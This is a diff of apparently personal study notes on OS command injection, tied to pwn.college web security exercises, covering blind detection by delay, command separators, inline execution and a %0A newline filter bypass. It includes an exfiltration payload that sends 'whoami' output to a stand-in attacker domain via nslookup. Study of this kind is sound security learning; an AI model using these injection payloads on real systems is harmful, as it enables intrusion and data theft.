@@ -26,6 +26,8 @@ Running processes 	ps -ef 	tasklist
 
 the application doesn't return the output of the command in it's http response.
 
+EX: [[pwn.college_web_security#CMDi 5]]
+
 ### detection by delay
 
 trigger a *time delay*, confirm the command execution based on the response time.
@@ -60,7 +62,6 @@ also use this trick to exfiltrate data:
 ``
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ``
-
 ## command separators, allowing commands to be chained together
 
 * &
@@ -71,3 +72,9 @@ also use this trick to exfiltrate data:
 only on Unix-based: `;`, Newline (`0x0a` or `\n`)
 
 Inline execution: inside backticks or `$()`
+
+#### bypass filter
+
+replacing characters with `.repalce()`:
+
+use `%0A` which will be interpreted as newline. [[pwn.college_web_security#CMDi 6]]
